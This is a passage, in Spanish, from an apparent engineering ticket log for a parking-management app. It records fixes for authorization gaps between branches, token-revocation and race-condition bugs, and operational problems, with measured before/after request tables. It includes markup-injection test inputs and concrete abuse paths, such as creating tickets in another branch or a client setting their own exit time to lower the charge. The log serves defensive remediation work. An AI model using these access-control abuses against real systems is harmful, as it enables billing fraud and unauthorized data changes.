  2. la ingesta **captura el rechazo** (`IntegrityError`), hace `rollback` y devuelve el ticket que ya había (con el mismo `SKIPPED_ALREADY_INSIDE` de siempre), en vez de propagar un 500.
- **Medido**: en la base de QA no había ninguna violación (0 y 0), así que la migración no encuentra datos que arreglar. Y la puerta de migraciones sigue verde: «el esquema migrado coincide con los modelos».
- **Criterios de aceptación**:
  - [x] La base rechaza el segundo ticket activo del mismo vehículo (IntegrityError).
  - [x] La base rechaza dos tickets activos en la misma plaza.
  - [x] Cerrar el ticket **sí** permite abrir otro (el índice es parcial: solo mira los activos).
  - [x] La ingesta, cuando la base rechaza por la carrera, devuelve el ticket existente y no un 500.
  - [x] 3 tests nuevos; prueba inversa: sin el índice, el test **falla**.

### T-106 · P2 (sospecha **refutada**) — el PDF del ticket no escapaba el texto del usuario

- **Estado**: **cerrado por medición** — no era un defecto; el comportamiento queda fijado con un test
- **La sospecha** (auditoría del 2026-10-23): el PDF del ticket metía texto del usuario (matrícula, marca) sin escapar, y eso lo rompía (reportlab interpreta el texto de un `Paragraph` como XML).
- **Medido**: **no se rompe**. Con una matrícula `1234&<>'"ABC` y una marca `Peugeot "307" <b>`, el PDF se genera sin problema (**2701 bytes**, empieza por `%PDF-`). El motivo: los datos del vehículo van en **celdas de tabla** (cadenas de texto, que reportlab no interpreta como XML) y el PDF de **informes** ya escapa todo lo que mete en `Paragraph` (`escape(...)`).
- **Lo que sí se hace**: un test (`backend/tests/test_ticket_pdf_escaping.py`) que **fija** ese comportamiento: si alguien metiera un dato del usuario dentro de un `Paragraph` sin escapar, el test se caería (el PDF no se generaría). Es la manera de que el falso positivo no vuelva como «avería» ni se «arregle» algo que no está roto.
- **Criterios de aceptación**:
  - [x] Medido: el PDF se genera con `& < > ' "` en la matrícula y en la marca (2701 bytes, `%PDF-`).
  - [x] Test que fija el comportamiento (1 test nuevo).


### T-104 · P1 (operación) — la auditoría crecía sola con las cámaras caídas

- **Estado**: **completado** — la fila se escribe una vez por hora y la purga va en lotes
- **Contexto** (auditoría del 2026-10-23): la ronda de heartbeat escribía una fila de auditoría **por cada cámara caída y cada ronda** (la ronda va cada 60 s).
- **Medido** (2026-10-23, en la base de QA):
  | acción | filas | % del total |
  |---|---|---|
  | `camera_offline_heartbeat` | **5.928** | **68 %** |
  | el resto (logins, tickets, usuarios…) | 2.835 | 32 % |
  Y **ningún panel de Grafana usa `camera_offline_heartbeat`**: el 68 % de la tabla de auditoría (que tiene una retención de 365 días) era ruido. En producción, con 50 cámaras caídas, serían **72.000 filas al día**.
- **Y la purga** (`purge_audit_logs`) las borraba de una sentada: un solo `DELETE` sobre millones de filas deja un WAL enorme, una transacción larga y bloquea la tabla.
- **El arreglo** (dos cosas):
  1. la fila de auditoría del heartbeat se escribe **la primera vez** y luego **una vez por hora** mientras la cámara siga caída (un `SET NX EX 3600` en Redis, el mismo patrón que el lock de la alerta). El rastro se conserva; la tabla deja de crecer sola. Y cuando la cámara vuelve, el freno se borra (la próxima caída se anota enseguida);
  2. la purga va **en lotes** de 5.000 filas (cada lote con su `commit`), en vez de un `DELETE` masivo.
- **Criterios de aceptación**:
  - [x] Medido: el 68 % de la tabla de auditoría es ruido del heartbeat, y ningún panel lo usa.
  - [x] Tres rondas seguidas escriben **una sola** fila (no una por ronda).
  - [x] La purga borra todo lo caducado **y va en lotes** (probado con lotes de dos y cinco filas: borra las cinco y no toca lo vigente).
  - [x] 2 tests nuevos; prueba inversa: sin el freno, el test **falla**.
  - [x] El conftest limpia también la clave del freno (si no, un test hereda la de otro: los ids de la BD se reinician, los de Redis no).


### T-107 · P2 (seguridad) — el token de reset no era de un solo uso ante una carrera

- **Estado**: **completado** — el token se reclama con un UPDATE condicional
- **Contexto**: el endpoint de reset **miraba** el token (`used_at is None`) y lo consumía al final. Entre el «mirar» y el «consumir» hay una ventana (revocar sesiones, hacer el bcrypt…), así que **dos peticiones con el mismo token a la vez** podían pasar las dos comprobaciones y las dos cambiar la contraseña: la segunda machacaba la primera y **las dos respondían «contraseña actualizada»**.
- **El arreglo**: el token se **reclama** con un UPDATE condicional (`WHERE used_at IS NULL`): solo una petición lo consigue; la otra espera a que la primera confirme y se encuentra con 0 filas → se rechaza. Va **después** de revocar los JWT (para que un fallo de Redis no consuma el token) y **antes** de cambiar la contraseña (si algo falla después, el `rollback` lo devuelve al estado consumible).
- **Criterios de aceptación**:
  - [x] El UPDATE condicional: dos consumidores del mismo token, el segundo **no toca ninguna fila**.
  - [x] Si otra petición consumió el token entre medias, esta se rechaza con 400 **y la contraseña no cambia**.
  - [x] 2 tests nuevos; prueba inversa: sin el reclamo atómico, el test de la carrera **falla**.

### T-108 · P2 (operación) — la purga de adjuntos hacía un escaneo de la tabla entera por adjunto

- **Estado**: **completado** — índices en `storage_path` y `thumbnail_path`
- **Contexto**: al purgar los adjuntos caducados, el código comprueba por cada adjunto si **otro** adjunto apunta al mismo fichero (para no borrar un fichero que otro sigue usando). Esa comprobación se hacía sobre `storage_path` y `thumbnail_path`, que **no tenían índice**.
- **Medido** (2026-10-23): el plan de la consulta era un **Seq Scan** sobre `incident_attachments`. Con 1.000 adjuntos caducados, la tarea de las 3:17 hacía **2.000 escaneos completos** de la tabla.
- **El arreglo**: dos índices (`ix_incident_attachments_storage_path`, `ix_incident_attachments_thumbnail_path`, migración `0017_adjuntos_rutas_idx`).
- **Medido después** (con 20.000 filas de prueba, en una transacción revertida): el plan pasa de **Seq Scan** a **Bitmap Index Scan** sobre los dos índices (5 búferes leídos en vez de la tabla entera).
- **Criterios de aceptación**:
  - [x] Medido: Seq Scan antes; Bitmap Index Scan después.
  - [x] La puerta de migraciones: «el esquema migrado coincide con los modelos».


### T-109 · P2 (seguridad) — un token emitido con Redis caído sobrevivía al cambio de contraseña

- **Estado**: **completado** — el login es fail-closed, como el middleware
- **Contexto** (auditoría del 2026-10-23): el registro de la sesión era **fail-open** (documentado como decisión deliberada: «si Redis cae, los tokens se devuelven igualmente»). El problema real no era el token inútil —el middleware de auditoría ya es fail-closed y devuelve 401 a todo lo que lleva token mientras Redis está caído—, sino lo que pasaba **cuando Redis volvía**:
  - ese token **no estaba registrado** en `user:{id}:active_jtis`;
  - un cambio de contraseña revoca las sesiones **registradas** (`revoke_all`);
  - o sea: **el token sobrevivía al reset**, y el atacante que lo tuviera seguía entrando con la contraseña nueva.
- **El arreglo**: el login pasa a ser **fail-closed**, igual que el middleware: si la sesión no se puede registrar, se responde **503** y **no se emite ningún token**. El usuario recibe un mensaje claro («el servicio de autenticación no está disponible») en vez de un token que no funciona, y no queda ningún token sin rastrear.
- **Y el aviso de auditoría se escribe después** de construir los tokens, para que no diga `login_success` de un login que en realidad salió con 503.
- **Criterios de aceptación**:
  - [x] Sin registro de sesión, el login responde 503 y **no emite** token (vía JSON).
  - [x] La vía OAuth2 se comporta igual (comparten `_build_tokens`).
  - [x] Un login que salió con 503 **no** se audita como `login_success`.
  - [x] 3 tests nuevos; prueba inversa: con el fail-open, los tests **fallan**.


### T-110 · P1 (seguridad) — tras «cerrar sesión», el refresh token seguía vivo 7 días

- **Estado**: **completado** — el logout revoca el refresh, y una sesión muerta cierra la app
- **Contexto** (auditoría del frontend, 2026-10-23): el logout del frontend llamaba a `POST /auth/logout` **sin cuerpo**. El backend solo blacklistea el refresh **si viene en el body** (`LogoutRequest.refresh_token`); sin él, solo se blacklistea el access.
- **Medido** (2026-10-23, contra la API real):
  | paso | resultado |
  |---|---|
  | login → logout **sin** body | 200 |
  | `POST /auth/refresh` con el refresh capturado | **200** (¡sigue sirviendo!) |
  | login → logout **con** `refresh_token` | 200 |
  | `POST /auth/refresh` con el refresh capturado | **401** (revocado ✓) |
  Es decir: «cerrar sesión» mataba el access pero **el refresh seguía vivo 7 días** (su TTL), y quien lo hubiera copiado (un XSS, una copia de sesión, un backup del navegador) podía **rotar access tokens nuevos** durante una semana.
- **El arreglo** (dos cosas):
  1. el logout del frontend **manda el `refresh_token`** en el cuerpo ✓ (el backend ya lo soportaba y lo blacklistea);
  2. cuando el refresh **no** se puede renovar, la sesión está **muerta**: el interceptor limpia los tokens y **avisa con un evento** (`solidapp:sesion-caducada`), y el store de autenticación limpia el perfil → el guard del router manda a `/login`. Antes el operador se quedaba en una página muerta: cada llamada daba 401 y la vista en vivo enseñaba una tabla vacía **sin ningún mensaje** (solo un F5 lo arreglaba).
- **Criterios de aceptación**:
  - [x] Medido: sin el arreglo, el refresh capturado seguía sirviendo (200) tras el logout.
  - [x] Medido: con el arreglo (el logout manda el refresh), el refresh capturado da **401**.
  - [x] Una sesión que no se puede renovar limpia el estado y lleva a `/login` (en vez de dejar la página muerta).
  - [x] `lint` y `vue-tsc` en verde; la QA visual recorre las 26 pantallas × 5 anchos sin fallos.

### T-111 · P2 (operación) — en la vista en vivo del operador, un fallo de la API era indistinguible de «no hay datos»

- **Estado**: **completado** — los tres fallos muestran un aviso
- **Contexto** (auditoría del frontend, 2026-10-23): la vista en vivo del operador (`/vivo`) tenía **tres `catch` mudos**: si la API fallaba (401, 500, backend caído), las plazas, los tickets y las alertas se quedaban **vacíos** y el operador no tenía forma de distinguir «falló la API» de «no hay tickets».
- **El arreglo**: los tres fallos muestran un aviso (`ui.pushToast('error', …)`). El gestor ya lo hacía (el mapa avisa); el operador no.
- **Criterios de aceptación**:
  - [x] Un fallo al cargar las plazas avisa (y no solo deja la lista vacía).
  - [x] Un fallo al cargar los tickets avisa.
  - [x] Un fallo al cargar las alertas avisa.
  - [x] La QA visual sigue pasando (26 pantallas × 5 anchos, 0 errores de consola).


### T-112 · P1 (operación) — el timeout del probe de cámara no se cumplía (la ronda tardaba 30 s)

- **Estado**: **completado** — la captura se abre con el timeout de apertura y de lectura
- **Contexto** (auditoría de Celery, 2026-10-23): `probe_camera` envuelve el sondeo en `asyncio.wait_for(..., timeout=5 s)`, pero el trabajo real ocurre en un **hilo** (`asyncio.to_thread`) que `wait_for` **no puede cancelar**. El timeout que mandaba era el de **FFmpeg (30 s)**, no el de 5 s del código. Y como la ronda usa `asyncio.run`, que en Python 3.11 **espera a los hilos del executor** (hasta 300 s), la ronda entera se alargaba con el mismo tiempo.
- **Medido** (2026-10-23, con una cámara colgada: una IP que no contesta):
  | | antes | después |
  |---|---|---|
  | el probe | **30,12 s** | **5,02 s** |
  | la ronda completa | 30,09 s | 5,07 s |
- **Por qué no era un detalle**: el healthcheck del worker es `celery inspect ping -t 20` → con una cámara colgada el contenedor se marcaba **unhealthy** y Docker lo reiniciaba (con `restart: unless-stopped`, T-101) → **bucle de reinicios** mientras la cámara siguiera colgando, y sin detecciones de cámara caída.
- **El arreglo**: la captura se abre **con el timeout** (los parámetros van en la apertura: en OpenCV, `cap.set()` después de abrir ya no cambia el tiempo de espera).
- **Criterios de aceptación**:
  - [x] Medido: 30,12 s → 5,02 s.
  - [x] La captura se abre con el timeout de apertura y de lectura (5 s).
  - [x] Una cámara colgada devuelve False en menos de 15 s (el test que lo vigila).
  - [x] 2 tests nuevos; prueba inversa: sin el timeout, los tests **fallan** (y tardan 30 s: el propio bug se nota).

### T-113 · P0 (seguridad) — el alta de tickets escribía en la sucursal que le dijeran, no en la del usuario

- **Estado**: **completado** — el alta se acota a las sucursales del usuario y el duplicado es un 409, no un 500
- **Contexto**: `POST /api/v1/tickets` (`backend/app/api/v1/tickets.py`) recibía `parking_id` **en el cuerpo** y lo aceptaba tal cual: el handler bloqueaba al rol `cliente`, pero **no miraba la membresía**. Dos endpoints más abajo, en `POST /tickets/manual`, el patrón correcto ya estaba escrito (`parking_context(payload.parking_id, ...)`). O sea: la comprobación existía en el fichero, pero no en el endpoint.
- **Medido** (2026-10-23, contra el sistema en marcha: `gestor.madrid@solidapp.es` es gestor **sólo** de la sucursal 11 «Madrid Centro A»; la 12 «Madrid Centro B» no tenía ni un miembro):

  | petición | antes | después |
  |---|---|---|
  | `POST /api/v1/tickets` con `parking_id` de la 12 | **201** (creó el ticket 617) | **403** |
  | `GET /api/v1/tickets/617` (el que acababa de crear) | **404** | — |
  | `POST /api/v1/tickets` con `parking_id` de la 11 (control) | 201 | 201 |
  | `POST /api/v1/tickets` con un vehículo que ya tiene ticket activo | **500** (`IntegrityError` sin capturar) | **409** |

- **Por qué era grave (y no un detalle de RBAC)**: el ticket creado en la sucursal ajena era **invisible para quien lo había creado** (el `GET` acotado por membresía devolvía 404). Con el índice único parcial de T-105 (`uq_tickets_activo_vehiculo`: vehículo + sucursal, sólo `activo`) ese ticket **bloqueaba la entrada real** de ese vehículo en esa sucursal: la ingesta (`app/services/ingest_service.py:332`) ve «el vehículo ya tiene ticket activo en este parking» → `SKIPPED_ALREADY_INSIDE` → **la entrada real no se registraba**. Y al salir, la cámara de salida (`:271`) cerraba **ese** ticket, con el `entry_at` fraudulento → el importe cobrar no correspondía a la estancia real. Es decir: un gestor podía **corruptionar el dato de facturación** de otra sucursal.
- **El arreglo**:
  1. `parking_context(payload.parking_id, current=user, db=db)` antes de crear el ticket (el patrón de `POST /tickets/manual`).
  2. El `IntegrityError` del índice único se captura y se devuelve como **409** con su motivo, en vez de un 500.
- **Criterios de aceptación**:
  - [x] Medido: `POST /tickets` con `parking_id` ajeno → **403** (antes 201).
  - [x] El alta en la sucursal propia sigue funcionando (201).
  - [x] Vehículo con ticket activo duplicado → **409**, no 500.
  - [x] 3 tests nuevos en `backend/tests/test_aislamiento_sucursal.py`; prueba inversa: sin el `parking_context`, el test del 403 **falla**.

### T-114 · P0 (seguridad) — una membresía convertía a un conductor en gestor de la sucursal

- **Estado**: **completado** — el alcance lo decide el **rol global**, no la fila de membresías
- **Contexto**: `enforce_parking_membership` (`backend/app/core/deps.py`) comprobaba dos cosas: que el usuario fuese admin o que tuviera **fila** en `parking_memberships`. **No miraba el rol.** Como el admin puede crear membresías (`POST /users/{id}/memberships`), un usuario con rol global `cliente` (un conductor) que tuviera una membresía pasaba **todos** los routers por sucursal: cámaras, plazas, tarifas, placas, incidencias y alertas.
- **Medido** (2026-10-23, cliente demo con una membresía que le dio el admin en la sucursal 11):

  | petición del cliente | antes | después |
  |---|---|---|
  | `POST /api/v1/parkings/11/spaces` (crear plaza) | **201** | **403** |
  | `POST /api/v1/parkings/11/cameras` (crear cámara) | **201** | **403** |
  | `POST /api/v1/parkings/11/tariffs` (**fijar el precio**) | **201** | **403** |
  | `GET /api/v1/parkings/11/cameras` | 200 | **403** |
  | `GET /api/v1/parkings/11/spaces` | 200 | **403** |
  | `GET /api/v1/parkings/11/alerts` | 200 | **403** |

  El de las tarifas es el peor: un conductor podía **fijar el precio por hora** de la sucursal (fraude de ingresos directo).
- **El arreglo**: `enforce_parking_membership` exige, además de la membresía, que el rol global sea de personal (`ROLES_STAFF`: admin, gestor, operador). El rol único de personal vive ahora en `app/core/deps.py` (antes estaba duplicado como `_STAFF` en `vehicles.py`).
- **Consecuencia documentada**: `role_in_parking` (la columna que dice «de qué rol es en **esta** sucursal») **se escribe y no se lee** en ningún sitio: el alcance lo decide el rol global. Está pendiente de una decisión de producto (RBAC por sucursal) y queda anotado en el codemap. La decisión y sus alternativas están en [`docs/adr/0003-aislamiento-por-sucursal.md`](../../adr/0003-aislamiento-por-sucursal.md).
- **Criterios de aceptación**:
  - [x] Medido: cliente con membresía → 403 en los tres POST y en los tres GET.
  - [x] El gestor con membresía sigue gestionando su sucursal (201).
  - [x] 2 tests nuevos; prueba inversa: sin el chequeo de rol, el test del 403 **falla**.

### T-115 · P0 (seguridad) — las geocercas no se cruzaban con la sucursal de la cámara

- **Estado**: **completado** — una única comprobación cruzada, usada por los cuatro endpoints
- **Contexto**: el router de cámaras valida la membresía del `parking_id` **del path**, pero tres de sus cuatro endpoints de geocerca **no comprobaban que la cámara fuera de esa sucursal**: filtraban sólo por `camera_id`. Dos de ellos lo hacían bien (`POST` y `DELETE`, que tienen el «`Camera.parking_id == parking_id`» escrito a mano) y dos no (`GET` y `PATCH`): cuatro copias del mismo concepto, dos de ellas equivocadas.
- **Medido** (2026-10-23, gestor de la sucursal 11; cámara 91 y geocerca 25 de la sucursal 12):

  | petición | antes | después |
  |---|---|---|
  | `GET /api/v1/parkings/11/cameras/91/geofences` | **200 con la geocerca de la 12** | **404** |
  | `PATCH /api/v1/parkings/11/cameras/91/geofences/25` | **200 y modificada** (x 0,1→0,99; y 0,2→0,99; w 0,3→0,01; h 0,4→0,01) | **404**, sin cambios |
  | `GET`/`PATCH` de las geocercas propias | 200 | 200 |

- **Por qué era grave**: la geocerca es la **zona de entrada/salida** que el OCR usa para decidir. Al moverla a una esquina diminuta, el OCR de la otra sucursal **dejaba de detectar las entradas**: la sucursal affected no registraba entradas y, por tanto, no facturaba. Un gestor de una sucursal podía **apagar la facturación** de otra.
- **El arreglo**: una única función `_camara_de_sucursal(db, camera_id, parking_id)` (`backend/app/api/v1/cameras.py`), usada por los cuatro endpoints (`GET`, `POST`, `PATCH`, `DELETE`): una comprobación, no cuatro.
- **Criterios de aceptación**:
  - [x] Medido: `GET` → 404 y `PATCH` → 404 sobre una cámara de otra sucursal.
  - [x] La geocerca de la otra sucursal queda **sin modificar** (se comprueba en el test).
  - [x] Las geocercas propias se siguen leyendo y modificando.
  - [x] 3 tests nuevos; prueba inversa: sin la comprobación cruzada, los tests **fallan**.

### T-116 · P1 (seguridad) — la flota de vehículos era global (matrículas, ediciones y vínculos)

- **Estado**: **completado** — listado global para admin, listado acotado por sucursal para el personal, y las escrituras para admin
- **Contexto**: `Vehicle` **no tiene `parking_id`** (es global), así que el aislamiento por sucursal no era posible tal cual. El endpoint `GET /api/v1/vehicles` no filtraba nada: devolvía la flota entera a cualquier admin, gestor u operador. Además, tres endpoints de escritura también lo permitían.
- **Medido** (2026-10-23, gestor de la sucursal 11):

  | petición | antes | después |
  |---|---|---|
  | `GET /api/v1/vehicles` (sin filtro) | **200 con 6 matrículas** (1111DIR, 1234ABC, 2222NEW, 8888ZZZ, 9999DIR, 9999ZZZ) | **403** (listado global = admin) |
  | `GET /api/v1/vehicles` como admin | 200 | 200 |
  | `GET /api/v1/vehicles?plate=1111` (búsqueda dirigida) | 200 | 200 |
  | `POST /api/v1/vehicles` (alta global) | 201 | **403** |
  | `PATCH /api/v1/vehicles/{id}` | 200 | **403** |
  | `POST /api/v1/vehicles/{id}/users` (vincular un usuario) | 201 | **403** |
  | `GET /api/v1/parkings/11/vehicles` (nuevo, acotado) | — | **200** con los vehículos de la 11 |

  Con 6 vehículos, el gestor veía 3 que no aparecen en sus propios movimientos (los que no tienen ticket en su sucursal).
- **Por qué era grave**: `POST /vehicles/{id}/users` escribe en `vehicle_users`, y esa tabla es **el ámbito de los tickets de cada cliente** (`_scoped_query` y `GET /users/me/tickets` filtran por ella). Es decir: un gestor de la sucursal A podía **cambiar qué tickets ve un cliente de la B**. Y `POST /vehicles` permitía **ocupar (squat) la matrícula** de un cliente de otra sucursal: el alta posterior de ese vehículo en su sucursal fallaba con 409 «Matrícula duplicada».
- **El arreglo**:
  1. `GET /vehicles` **sin** `plate` → sólo admin. **Con** `plate` → búsqueda dirigida para el personal. Se llegaron a poner 3 caracteres mínimos y se quitaron: no cierra nada (3 caracteres siguen siendo un comodín sobre una matrícula de 6-7) y rompía un contrato ya verificado (T-93: el comodín `%` va escapado y debe poder buscarse literal). El acotado que importa es el **listado global**.
  2. `POST /vehicles`, `PATCH /vehicles/{id}` y `POST /vehicles/{id}/users` → sólo admin. El alta legítima la hace el cliente (`POST /users/me/vehicles`) o el operador con el alta manual de ticket (`POST /tickets/manual`, que resuelve y crea el vehículo).
  3. **Endpoint nuevo** `GET /api/v1/parkings/{parking_id}/vehicles`: los vehículos con ticket en esa sucursal, con `parking_context` (un gestor de otra sucursal recibe 403, no una lista vacía). Lo usa la vista de movimientos del gestor, que antes descargaba la flota global para pintar un desplegable.
- **Criterios de aceptación**:
  - [x] Medido: `GET /vehicles` sin filtro → 403 para el gestor, 200 para el admin.
  - [x] La búsqueda por matrícula sigue siendo del personal, y el comodín `%` no sirve para enumerar la flota (T-93 se mantiene).
  - [x] Alta, edición y vínculo de vehículos → 403 para el personal.
  - [x] `GET /parkings/{id}/vehicles` devuelve los vehículos de esa sucursal y 403 al gestor de otra.
  - [x] Frontend: `MovementsView.vue` usa el endpoint acotado.
  - [x] 5 tests nuevos; prueba inversa: sin el acotado, los tests **fallan**.

### T-117 · P2 (decisión de producto) — las tarifas de cualquier sucursal son públicas

- **Estado**: **refutado por medición** — es una decisión de producto, no un defecto
- **Contexto**: `GET /api/v1/parkings/{parking_id}/tariffs` sólo exige `get_current_user`: cualquiera autenticado puede leer la tabla de precios de cualquier sucursal enumerando el `parking_id`. La escritura sí está acotada (`parking_context`).
- **Por qué NO es un defecto**: el **cliente final necesita el precio antes de aparcar** (la app del cliente muestra el importe estimado). El precio es el precio que va a pagar quien aparca: no es dato personal ni secreto comercial. Cerrarlo rompería un caso de uso real de la app.
- **Lo que sí se hace**: un test que **fija** el comportamiento actual (para que nadie lo cambie por error creyendo que es una fuga) y nota en el codemap de que la lectura de tarifas es deliberadamente abierta.
- **Criterios de aceptación**:
  - [x] Medido: `GET /parkings/{id}/tariffs` con un cliente → 200 (es lo que la app necesita).
  - [x] La escritura de tarifas sigue acotada a la sucursal (403 al gestor de otra).
  - [x] Test que fija el contrato.

### T-118 · P1 (puerta) — una puerta que vigila el aislamiento por sucursal

- **Estado**: **completado** — la puerta está en verde sobre el código real y su autoprueba demuestra que detecta los tres patrones
- **Contexto**: los cuatro defectos de T-113…T-116 están cubiertos por tests, pero un test sólo cubre el endpoint que ya existe. Lo que falta es el **endpoint que alguien escriba mañana**, que no tendrá test todavía. Esa es la razón de una puerta **estática** (mira el código, no el comportamiento).
- **Qué comprueba** (`tools/verificar_aislamiento_sucursal.py`, AST sobre `backend/app/api/v1/*.py`):
  - **R1**: un endpoint cuyo cuerpo acepta `parking_id` tiene que validar la membresía (salvo que sea de admin solamente).
  - **R2**: un router cuyo prefijo lleva `{parking_id}` tiene que acotar: con `parking_context` en las dependencias del router, o endpoint a endpoint.
  - **R3**: un endpoint que carga un recurso con sucursal tiene que comprobar de qué sucursal es (cruzarlo con el `parking_id` del path, o validar la membresía sobre el recurso).
- **El fallo que encontró su propia prueba inversa**: la primera versión buscaba `parking_context(` **en el texto** del endpoint. El **docstring** del endpoint la menciona («el patrón correcto ya estaba… `parking_context(...)`»), así que la puerta daba el visto bueno a un endpoint que **no acotaba**: **verde sobre mentira**. Ahora las llamadas y las comparaciones se leen del **AST** (el código), no del texto (que incluye la prosa).
- **La prueba inversa** (`D:\tmp\prueba_inversa_puerta.py`, y reproducible): reintroduce los defectos en el código real y comprueba que la puerta los marca:

  | defecto reintroducido | regla que lo detecta |
  |---|---|
  | `POST /tickets` sin `parking_context` | **R1** |
  | `GET .../geofences` sin la comprobación cruzada | **R3** |
  | `PATCH .../geofences/{id}` sin la comprobación cruzada | **R3** |
  | `parking_context` sólo **mencionado** en el docstring | **R1** |

- **Exenciones con motivo** (una exención sin motivo es una opinión): `GET /parkings/{parking_id}/tariffs` (T-117: el precio es público para quien va a aparcar).
- **Criterios de aceptación**:
  - [x] Autoprueba: detecta los tres patrones con casos de mentira **escritos a mano** (en runtime, con sus propios schemas y modelos).
  - [x] Autoprueba: **no grita** con el código correcto (una puerta que grita de más es una puerta que nadie mira).
  - [x] Prueba inversa: los cuatro casos reintroducidos los detecta (incluido el de la prosa).
  - [x] Verde sobre el código real: **97 endpoints analizados, 0 problemas**.
  - [x] Registrada en `tools/autopruebas.py` (meta-puerta) y en `tools/verificar_repo.py`.

### T-119 · P1 (privacidad) — la caché del service worker no la vigilaba nadie

- **Estado**: **completado** — la QA de la PWA mira *cuáles* son las entradas y hay una puerta estática que vigila la política
- **Contexto**: la PWA cachea el *shell* (HTML, JS, CSS, iconos) para arrancar sin red. La API **no** se cachea nunca, y eso está escrito en `frontend/public/sw.js` (la exclusión de `/api/` está antes de cualquier `event.respondWith`). El problema no era el comportamiento: era que **nadie lo vigilaba**:
  - la QA de la PWA (`frontend/scripts/qa_pwa.py`) contaba las entradas de la caché (`entradasCache > 0`) pero **no miraba cuáles eran**: si alguien añadía una regla de cacheo para `/api/`, seguiría en verde con tickets, matrículas y fotos de incidentes en la caché del navegador.
  - no existía ninguna puerta sobre el service worker.
- **Medido** (auditoría del 2026-10-23, sobre el código): hoy **no** hay fuga: el SW excluye `/api/` (`sw.js:160-162`), el cliente HTTP usa siempre `baseURL = '/api/v1'` (`client.ts:17`, ruta relativa ⇒ mismo origen ⇒ bajo `/api/`), no hay IndexedDB ni caché de axios, y los tokens viven en `sessionStorage` (se borran al cerrar sesión). Sin conexión, la app devuelve un 503 honesto en vez de enseñar datos viejos.
- **Lo que sí quedaba abierto**: (a) la exclusión depende de que el prefijo `/api/` coincida en **tres** sitios (cliente, SW y nginx) y nada lo comprobaba; (b) `ignoreVary: true` está activo, que es exactamente el mecanismo que convertiría un futuro «cachear la API» en una fuga **entre usuarios**; (c) el SW no purga la caché al cerrar sesión (hoy es inocuo, porque la API nunca se cacheó: la defensa real es «la API no se cachea», no «el logout limpia»).
- **El arreglo**:
  1. La QA de la PWA ahora **reúne las URLs** de todas las cachés y **falla si alguna está bajo `/api/`**. Es la comprobación empírica: ocurre en un navegador de verdad, con la app en marcha.
  2. Puerta nueva `tools/verificar_cache_service_worker.py` (estática, va en el CI): **S1** la exclusión de `/api/` tiene que estar antes del primer `event.respondWith`; **S2** los tres prefijos (cliente, SW, nginx) tienen que coincidir; **S3** la lista de precache no puede traer la API.
- **Criterios de aceptación**:
  - [x] La QA de la PWA falla si aparece una entrada de caché bajo `/api/` (comprobación en el navegador real).
  - [x] La puerta detecta los tres casos de mentira: exclusión después del `respondWith`, precache con la API, prefijos divergentes.
  - [x] La puerta **no** grita con el código correcto (autoprueba con el caso bueno).
  - [x] Registrada en `tools/autopruebas.py`, `tools/verificar_repo.py` y en el workflow del CI (con `actionlint` en verde).
  - [x] Verde sobre el código real: «el service worker no cachea la API».

### T-120 · P0 (negocio) — un cliente podía cerrar su propio ticket y **fijarse el importe de su cobro**

- **Estado**: **completado** — cerrar un ticket es una operación de personal
- **Contexto**: `POST /tickets/{ticket_id}/close` (`backend/app/api/v1/tickets.py`) usaba `get_current_user` + `_scoped_query`, y `_scoped_query` incluye **los tickets del propio cliente**. O sea: el endpoint no distinguía «soy el personal que gestiona esta sucursal» de «soy el conductor de este coche». (El alta de tickets, `POST /tickets`, ya bloqueaba al cliente explícitamente: el cierre, no.)
- **Medido** (2026-10-23, contra el sistema en marcha: el cliente demo con un ticket activo de su vehículo, abierto por el gestor de su sucursal):

  | petición del cliente | antes | después |
  |---|---|---|
  | `POST /tickets/620/close` (su ticket activo) | **200** — ticket cerrado, 0,63 € | **403** |
  | `POST /tickets/621/close` con `exit_at` = **ayer** (estancia de 10 días) | **200** — cobrado **22,50 €** como si fuera de 1 día | **403** |
  | el ticket, después | `cerrado`, con importe | `activo`, sin importe |
  | `POST /tickets/{id}/close` como gestor de la sucursal (control) | 200 | 200 |

- **Por qué es grave**: el cliente no solo cerraba su estancia: **elegía la hora de salida**, y por tanto **el importe**. Con el tope diario de la tarifa, una estancia de 10 días se podía cobrar como un día. Es un agujero de ingresos **directo** y del lado del que paga.
- **El arreglo**: `close_ticket` exige un rol de personal (`require_role(*ROLES_STAFF)`), como ya exigía el alta de tickets. Los tickets los cierra la cámara de salida (o el personal, a mano: para eso está el endpoint). `require_role` va **antes** de la consulta, así que un cliente recibe 403 sin que la respuesta revele si el ticket existe.
- **Lo que NO se rompe**: el frontend no llama a este endpoint (es de uso interno del personal), así que la app no cambia.
- **Pendiente de la misma familia** (medido en la misma auditoría, sin arreglar todavía): el cierre por cámara **no comprueba** que el ticket siga activo al commitear y no bloquea la fila (`SELECT ... FOR UPDATE`), así que un cierre manual y un cierre por cámara a la vez **ambos** tienen éxito y **el último que commite manda** sobre el importe: el cobro no es determinista. Ver T-121.
- **Criterios de aceptación**:
  - [x] Medido: el cliente recibe 403 al cerrar su ticket y al fijar la hora de salida; el ticket sigue activo y sin importe.
  - [x] El personal de la sucursal sigue cerrando tickets (200).
  - [x] Un gestor de otra sucursal tampoco puede cerrarlo (403/404).
  - [x] 4 tests nuevos en `backend/tests/test_ticket_cierre.py`; prueba inversa: con `get_current_user` en vez de `require_role`, los dos tests de denegación **fallan**.
  - [x] Inventario de la API regenerado (`require_role('admin', 'gestor', 'operador')`).

### T-121 · P1 (negocio) — dos cierres del mismo ticket: el importe dependía del orden de commit

- **Estado**: **completado** — el cierre es condicional (atómico) en los dos caminos
- **Contexto**: tanto el cierre manual (`POST /tickets/{id}/close`) como el de la cámara de salida (`_close_ticket_for_exit`) comprobaban que el ticket estaba `ACTIVO` **al leerlo** y luego hacían `db.commit()` **a ciegas**. Es un TOCTOU: entre la lectura y el commit cabe otro cierre.
- **Medido** (2026-10-23): con el defecto, al forzar la intercalación (otra sesión cierra el ticket en el punto en que el primero está calculando el importe) **los dos cierres tienen éxito** y el último que commitea manda sobre el importe:
  ```
  AssertionError: los dos cierres tuvieron exito (el ultimo que commite gana)
  ```
  Con el defecto de vuelta, la ingesta devolvía `ticket_closed` (es decir: **volvía a cerrar y a cobrar** una estancia ya cerrada).
- **Por qué importa**: el cobro no era determinista. El ticket se cuenta una sola vez en los ingresos (una fila), pero se generaban **dos PDF** y **dos eventos SSE**, y el importe final dependía de qué commit llegara el último. En una carrera real entre la cámara de salida y un operador cerrando a mano, es un importe que puede ser cualquiera de los dos.
- **El arreglo**: el cierre se hace con un **UPDATE condicional** (`WHERE id = ... AND status = 'activo'`). La comprobación y la escritura son la misma sentencia: no hay ventana.
  - El cierre manual: si el UPDATE no actualiza ninguna fila → **409** («El ticket ya no está activo»).
